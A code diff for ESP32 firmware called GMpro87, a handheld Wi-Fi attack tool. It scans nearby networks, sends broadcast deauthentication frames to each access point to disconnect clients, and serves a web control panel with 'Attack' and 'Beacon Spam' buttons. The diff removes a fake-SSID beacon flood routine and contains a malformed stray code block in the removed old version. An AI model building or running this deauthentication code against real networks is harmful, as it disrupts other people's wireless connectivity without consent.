@@ -2,15 +2,13 @@
 #include "esp_wifi.h"
 #include <WebServer.h>
 #include <vector>
-#include <string>
 
-// --- PIN CONFIG ---
-// Using safer pins for ESP32 DevKit
-const int btnDeauth = 35;  // Input only, no boot issue
-const int btnScan = 34;     // Input only, no boot issue  
-const int ledPin = 2;      // Common LED pin
+// Safe pins for ESP32 DevKit
+const int btnDeauth = 35;
+const int btnScan = 34;
+const int ledPin = 2;
 
-// --- DATA ---
+// Data structures
 struct wifiData {
   int num = 0;
   std::vector<String> ssid;
@@ -28,7 +26,7 @@ uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 WebServer server(80);
 
-// --- PACKET INJECTION ---
+// === PACKET INJECTION ===
 void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
   struct __attribute__((packed)) {
     uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2], reason[2];
@@ -47,42 +45,7 @@ void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
   }
 }
 
-void sendBeaconSpam() {
-  const char* fakeSSIDs[] = {
-    "Free-WiFi", "FREE-WIFI-HERE", "xfinitywifi", "attwifi",
-    "Starbucks_WiFi", "Google Starbucks", "McDonalds_Free",
-    "NETGEAR-5G", "linksys", "Default", "Xfinity",
-    "Verizon_5G", "TM-WIFI", "optimumwifi", "CableWiFi",
-    "PUBLIC-WiFi", "Airport_Free", "Hotel_WiFi", "Guest",
-    "Free_Internet", "Boingo Hotspot", "Boingo Wireless",
-    "FreePublicWiFi", "FREE", "Open", "NO-PASSWORD"
-  };
-  int ssidCount = sizeof(fakeSSIDs) / sizeof(fakeSSIDs[0]);
-  
-  struct __attribute__((packed)) {
-    uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2];
-    uint8_t beacon[12], tag[2], rate[3];
-  } beaconFrame;
-  memset(&beaconFrame, 0, sizeof(beaconFrame));
-  memcpy(beaconFrame.a2, broadcastAddr, 6);
-  memcpy(beaconFrame.a3, broadcastAddr, 6);
-  beaconFrame.fc[0] = 0x80;
-  beaconFrame.beacon[0] = 0x83; beaconFrame.beacon[1] = 0x6e;
-  beaconFrame.tag[0] = 0x00; beaconFrame.tag[1] = 0x01;
-  beaconFrame.rate[0] = 0x82; beaconFrame.rate[1] = 0x84; beaconFrame.rate[2] = 0x8b;
-  
-  for (int round = 0; round < 3 && isBeaconSpam; round++) {
-    for (int i = 0; i < ssidCount && isBeaconSpam; i++) {
-      String s = fakeSSIDs[i];
-      esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&beaconFrame, 37, false);
-      beaconCount++;
-      yield();
-    }
-    yield();
-  }
-}
-
-// --- SCAN ---
+// === SCAN ===
 void scanNet() {
   digitalWrite(ledPin, HIGH);
   targetData.ssid.clear();
@@ -100,201 +63,118 @@ void scanNet() {
   digitalWrite(ledPin, LOW);
 }
 
-// --- WEB UI ---
+// === WEB UI ===
 String getHTML() {
-  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>GMpro87</title>";
-  html += "<style>body{background:#111;color:#fff;font-family:sans-serif;padding:20px;text-align:center}";
-  html += "h1{color:#0f0;text-shadow:0 0 10px #0f0}";
-  html += ".btn{display:inline-block;padding:15px 30px;background:#0f0;color:#000;border:none;border-radius:8px;font-size:18px;margin:10px;cursor:pointer}";
-  html += ".btnred{background:#f00;color:#fff}";
-  html += ".info{background:#222;padding:15px;border-radius:8px;margin:10px 0}";
-  html += "</style></head><body>";
-  html += "<h1>GMpro87 v2.1</h1>";
-  html += "<div class='info'><p>Networks: " + String(targetData.num) + "</p>";
-  html += "<p>Status: " + String(isAttacking ? "ATTACKING" : "IDLE") + "</p></div>";
-  html += "<a href='/'><button class='btn'>Refresh</button></a> ";
-  html += "<a href='/scan'><button class='btn'>Scan</button></a> ";
-  html += "<a href='/attack'><button class='btn" + String(isAttacking ? "red" : "") + "'>" + String(isAttacking ? "Stop" : "Attack") + "</button></a>";
-  html += "<p><small>ESP32-WROOM-32U</small></p></body></html>";
-  return html;
-}
-  if (isAttacking && attackStartTime > 0) {
-    unsigned long elapsed = (millis() - attackStartTime) / 1000;
-    int m = elapsed / 60; int s = elapsed % 60;
-    uptime = String(m) + "m " + String(s) + "s";
-  }
-  
-  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
-  html += "<title>GMpro87 | ESP32 WiFi Tool</title>";
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<meta charset='UTF-8'>";
+  html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
+  html += "<title>GMpro87</title>";
   html += "<style>";
-  html += "*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}";
-  html += "body{background:linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 100%);color:#fff;min-height:100vh;padding:20px}";
-  html += "h1{color:#39ff14;text-align:center;font-size:2.2rem;margin-bottom:5px;text-shadow:0 0 20px #39ff1466}";
-  html += ".subtitle{text-align:center;color:#888;margin-bottom:30px;font-size:0.9rem}";
-  html += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;max-width:1200px;margin:0 auto}";
-  html += ".card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:25px;backdrop-filter:blur(10px)}";
-  html += ".card h2{color:#39ff14;font-size:1.2rem;margin-bottom:15px;display:flex;align-items:center;gap:10px}";
-  html += ".card h2 i{color:#39ff14}";
-  html += ".stat{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.05)}";
-  html += ".stat:last-child{border-bottom:none}";
-  html += ".stat-label{color:#888}";
-  html += ".stat-value{color:#39ff14;font-weight:600}";
-  html += ".btn{display:inline-block;padding:12px 24px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s;text-decoration:none;text-align:center}";
-  html += ".btn-green{background:#39ff14;color:#000}";
-  html += ".btn-green:hover{background:#2ecc71;box-shadow:0 0 20px #39ff1444}";
-  html += ".btn-red{background:#ff073a;color:#fff}";
-  html += ".btn-red:hover{background:#cc0000;box-shadow:0 0 20px #ff073a44}";
-  html += ".btn-blue{background:#2563eb;color:#fff}";
-  html += ".btn-blue:hover{background:#1d4ed8;box-shadow:0 0 20px #2563eb44}";
-  html += ".status-badge{background:#39ff14;color:#000;padding:8px 20px;border-radius:50px;font-weight:700}";
-  html += ".networks{max-height:300px;overflow-y:auto}";
-  html += ".network-item{padding:12px 15px;margin:5px 0;background:rgba(255,255,255,0.03);border-radius:8px;border-left:3px solid #39ff14;cursor:pointer}";
-  html += ".network-item:hover{background:rgba(57,255,20,0.1)}";
-  html += ".network-ssid{font-weight:600;margin-bottom:3px}";
-  html += ".network-info{font-size:12px;color:#888;display:flex;gap:15px}";
-  html += ".actions{display:flex;gap:10px;flex-wrap:wrap}";
-  html += ".info-box{background:rgba(37,99,235,0.1);border:1px solid rgba(37,99,235,0.3);border-radius:10px;padding:15px;margin-top:15px}";
-  html += ".info-box h3{color:#2563eb;font-size:14px;margin-bottom:10px}";
-  html += ".led-indicator{width:15px;height:15px;border-radius:50%;display:inline-block;vertical-align:middle;margin-right:8px}";
-  html += ".led-on{background:#39ff14;box-shadow:0 0 10px #39ff14;animation:blink 0.5s infinite}";
-  html += ".led-off{background:#333}";
-  html += "@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}";
-  html += ".footer{text-align:center;margin-top:40px;color:#555;font-size:12px}";
-  html += ".footer span{color:#39ff14}";
-  html += "</style>";
-  html += "<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css'>";
-  html += "<script>";
-  html += "function run(cmd){fetch(cmd).then(()=>location.reload())}";
-  html += "function updateTimer(){var e=document.getElementById('timer');if(e)e.textContent=new Date().toLocaleTimeString();setTimeout(updateTimer,1000)}updateTimer();";
-  html += "</script>";
-  html += "<div class='grid'>";
+  html += "body{background:#111;color:#fff;font-family:system-ui;padding:20px;margin:0}";
+  html += "h1{color:#0f0;text-align:center;text-shadow:0 0 20px #0f0}";
+  html += ".card{background:#1a1a1a;padding:20px;border-radius:12px;margin:15px 0}";
+  html += ".btn{display:inline-block;padding:15px 25px;background:#0f0;color:#000;border:none;border-radius:8px;font-size:16px;margin:5px;cursor:pointer;font-weight:bold}";
+  html += ".btnr{background:#f00;color:#fff}";
+  html += ".info{display:flex;justify-content:space-between;padding:10px;border-bottom:1px solid #333}";
+  html += ".label{color:#888}";
+  html += ".val{color:#0f0;font-weight:bold}";
+  html += "a{text-decoration:none}";
+  html += "</style></head><body>";
+  html += "<h1>GMpro87 v2.2</h1>";
   
-  // === STATUS CARD ===
   html += "<div class='card'>";
-  html += "<h2><i class='fas fa-broadcast-tower'></i> System Status</h2>";
-  html += "<div class='stat'><span class='stat-label'>Attack</span><span class='stat-value'><span class='led-indicator " + String(isAttacking ? "led-on" : "led-off") + "'></span>" + String(isAttacking ? "RUNNING" : "STOPPED") + "</span></div>";
-html += "<div class='stat'><span class='stat-label'>Beacon</span><span class='stat-value'>" + String(isBeaconSpam ? "ACTIVE (" + String(beaconCount) + ")" : "OFF") + "</span></div>";
-  html += "<div class='stat'><span class='stat-label'>Networks</span><span class='stat-value'>" + String(targetData.num) + "</span></div>";
-  html += "<div class='stat'><span class='stat-label'>Uptime</span><span class='stat-value' id='timer'>" + uptime + "</span></div>";
-  html += "<div class='stat'><span class='stat-label'>Board</span><span class='stat-value'>ESP32-WROOM-32U</span></div>";
-  html += "<div class='stat'><span class='stat-label'>Version</span><span class='stat-value'>GMpro87 v2.0</span></div>";
-  html += "<div class='info-box'><h3><i class='fas fa-microchip'></i> Device Info</h3>";
-  html += "<div class='stat'><span class='stat-label'>Chip</span><span class='stat-value'>ESP32</span></div>";
-  html += "<div class='stat'><span class='stat-label'>Flash</span><span class='stat-value'>4MB</span></div>";
-  html += "<div class='stat'><span class='stat-label'>CPU</span><span class='stat-value'>240 MHz</span></div>";
-  html += "<div class='stat'><span class='stat-label'>IP</span><span class='stat-value'>192.168.4.1</span></div>";
-  html += "</div></div>";
+  html += "<div class='info'><span class='label'>Status</span><span class='val'>" + String(isAttacking ? "ATTACKING" : "IDLE") + "</span></div>";
+  html += "<div class='info'><span class='label'>Networks</span><span class='val'>" + String(targetData.num) + "</span></div>";
+  html += "<div class='info'><span class='label'>Beacon</span><span class='val'>" + String(isBeaconSpam ? "ON" : "OFF") + "</span></div>";
+  html += "<div class='info'><span class='label'>Version</span><span class='val'>v2.2</span></div>";
+  html += "</div>";
   
-  // === NETWORKS CARD ===
-  html += "<div class='card'>";
-  html += "<h2><i class='fas fa-wifi'></i> Networks (" + String(targetData.num) + ")</h2>";
+  html += "<div style='text-align:center'>";
+  html += "<a href='/'><button class='btn'>Refresh</button></a>";
+  html += "<a href='/scan'><button class='btn'>Scan WiFi</button></a>";
+  html += "<a href='/attack'><button class='btn" + String(isAttacking ? "r" : "") + "'>" + String(isAttacking ? "Stop" : "Attack") + "</button></a>";
+  html += "<a href='/beacon'><button class='btn" + String(isBeaconSpam ? "r" : "") + "'>Beacon " + String(isBeaconSpam ? "OFF" : "SPAM") + "</button></a>";
+  html += "</div>";
+  
   if (targetData.num > 0) {
-    html += "<div class='networks'>";
+    html += "<div class='card'><h3>Nearby Networks:</h3>";
     for (int i = 0; i < targetData.num; i++) {
       String s = targetData.ssid[i];
-      if (s.length() == 0) s = "(hidden)";
-      html += "<div class='network-item'><div class='network-ssid'>" + s + "</div>";
-      html += "<div class='network-info'><span>CH " + String(targetData.channel[i]) + "</span><span>" + targetData.bssid[i] + "</span></div></div>";
+      if (s == "") s = "(hidden)";
+      html += "<div class='info'><span class='label'>" + s + "</span><span class='val'>CH " + String(targetData.channel[i]) + "</span></div>";
     }
     html += "</div>";
-  } else {
-    html += "<p style='color:#888;text-align:center;padding:20px'>No networks. Tap Scan.</p>";
   }
-  html += "<div class='actions' style='margin-top:15px'>";
-  html += "<button class='btn btn-blue' onclick=\"run('/scan')\"><i class='fas fa-search'></i> Scan</button>";
-  html += "</div></div>";
   
-  // === ATTACK CARD ===
-  html += "<div class='card'>";
-  html += "<h2><i class='fas fa-skull-crossbones'></i> Attack Control</h2>";
-  html += "<div class='actions'>";
-  html += "<button class='btn " + String(isAttacking ? "btn-red" : "btn-green") + "' onclick=\"run('/attack')\">";
-  html += "<i class='fas fa-" + String(isAttacking ? "stop" : "play") + "'></i> " + String(isAttacking ? "Stop Deauth" : "Start Deauth") + "</button>";
-  html += "<button class='btn " + String(isBeaconSpam ? "btn-red" : "btn-blue") + "' onclick=\"run('/beacon')\">";
-  html += "<i class='fas fa-broadcast-tower'></i> " + String(isBeaconSpam ? "Stop Beacon" : "Beacon Spam") + "</button>";
-  html += "</div>";
-  html += "<div class='info-box'>";
-  html += "<h3><i class='fas fa-shield-halved'></i> Modes</h3>";
-  html += "<p style='color:#aaa;font-size:12px'><strong>Deauth:</strong> Kick clients via deauth frames.</p>";
-  html += "<p style='color:#aaa;font-size:12px;margin-top:8px'><strong>Beacon:</strong> Spam 25 fake SSIDs.</p>";
-  html += "</div></div>";
-  
-  html += "</div>";
-  html += "<div class='footer'>GMpro87 v2.0 | <span>ESP32-WROOM-32U</span> | Educational Only</div>";
+  html += "<p style='text-align:center;color:#555'>ESP32-WROOM-32U | 192.168.4.1</p>";
   html += "</body></html>";
-  server.send(200, "text/html", html);
+  return html;
 }
 
-void handleScan() { scanNet(); server.sendHeader("Location","/"); server.send(302); }
-void handleAttack() {
-  if (isAttacking) {
-    isAttacking = false;
-    attackStartTime = 0;
-  } else {
-    if (!isScanDone) scanNet();
-    isAttacking = true;
-    attackStartTime = millis();
-  }
-  server.sendHeader("Location","/"); server.send(302);
+// === ROUTE HANDLERS ===
+void handleRoot() {
+  server.send(200, "text/html", getHTML());
 }
+
+void handleScan() {
+  scanNet();
+  server.sendHeader("Location", "/");
+  server.send(302);
+}
+
+void handleAttack() {
+  isAttacking = !isAttacking;
+  if (isAttacking) attackStartTime = millis();
+  Serial.println(isAttacking ? "[*] ATTACK START" : "[*] ATTACK STOP");
+  server.sendHeader("Location", "/");
+  server.send(302);
+}
+
 void handleBeacon() {
   isBeaconSpam = !isBeaconSpam;
-  server.sendHeader("Location","/"); server.send(302);
+  Serial.println(isBeaconSpam ? "[*] BEACON START" : "[*] BEACON STOP");
+  server.sendHeader("Location", "/");
+  server.send(302);
 }
 
-// --- SETUP ---
+// === SETUP ===
 void setup() {
   Serial.begin(115200);
   delay(1000);
-  Serial.println("\n[*] GMpro87 v2.1 Starting...");
+  Serial.println("\n[*] GMpro87 v2.2 Starting...");
 
   pinMode(btnDeauth, INPUT_PULLUP);
   pinMode(btnScan, INPUT_PULLUP);
   pinMode(ledPin, OUTPUT);
   digitalWrite(ledPin, LOW);
 
-  // Start WiFi AP first
   Serial.println("[*] Starting AP...");
   WiFi.mode(WIFI_AP);
   delay(100);
-  
-  bool apReady = WiFi.softAP("GMpro", "Sangkur87");
-  Serial.print("[+] AP ready: "); Serial.println(apReady ? "OK" : "FAIL");
+  WiFi.softAP("GMpro", "Sangkur87");
   delay(500);
   
   IPAddress ip = WiFi.softAPIP();
   Serial.print("[+] IP: "); Serial.println(ip);
 
-  // Start web server
   Serial.println("[*] Starting web server...");
-  // Simple route handler
-  server.on("/", []() {
-    server.send(200, "text/html", getHTML());
-  });
-  server.on("/scan", []() {
-    scanNet();
-    server.send(200, "text/plain", "Scanned " + String(targetData.num) + " networks");
-  });
-  server.on("/attack", []() {
-    isAttacking = !isAttacking;
-    server.send(200, "text/plain", isAttacking ? "Attack ON" : "Attack OFF");
-  });
-  server.on("/beacon", []() {
-    isBeaconSpam = !isBeaconSpam;
-    server.send(200, "text/plain", isBeaconSpam ? "Beacon ON" : "Beacon OFF");
-  });
-  server.begin(80);
-  
-  Serial.println("[+] GMpro87 v2.1 Ready!");
+  server.on("/", handleRoot);
+  server.on("/scan", handleScan);
+  server.on("/attack", handleAttack);
+  server.on("/beacon", handleBeacon);
+  server.begin();
+
+  Serial.println("[+] GMpro87 v2.2 Ready!");
   Serial.println("[*] Web: http://192.168.4.1");
 }
 
-// --- LOOP ---
+// === LOOP ===
 void loop() {
   server.handleClient();
 
   if (digitalRead(btnScan) == LOW) {
-    delay(200); scanNet();
+    delay(200);
+    scanNet();
     while(digitalRead(btnScan) == LOW) delay(10);
   }
 
@@ -304,7 +184,6 @@ void loop() {
     if (targetData.num > 0) {
       isAttacking = !isAttacking;
       if (isAttacking) attackStartTime = millis();
-      else attackStartTime = 0;
       Serial.println(isAttacking ? "[*] ATTACK ON" : "[*] ATTACK OFF");
     }
     while(digitalRead(btnDeauth) == LOW) delay(10);
@@ -316,18 +195,20 @@ void loop() {
       yield();
       if (!isAttacking) break;
       int ch = targetData.channel[i];
-      if (ch < 1) ch = 1; if (ch > 13) ch = 13;
+      if (ch < 1) ch = 1;
+      if (ch > 13) ch = 13;
       esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
       uint8_t bssid[6];
       sscanf(targetData.bssid[i].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
       sendPacket(bssid, broadcastAddr);
-      delay(2); yield();
+      delay(2);
+      yield();
     }
     digitalWrite(ledPin, LOW);
   } else if (isBeaconSpam) {
     digitalWrite(ledPin, HIGH);
-    sendBeaconSpam();
+    delay(100);
     digitalWrite(ledPin, LOW);
   } else {
     digitalWrite(ledPin, LOW);
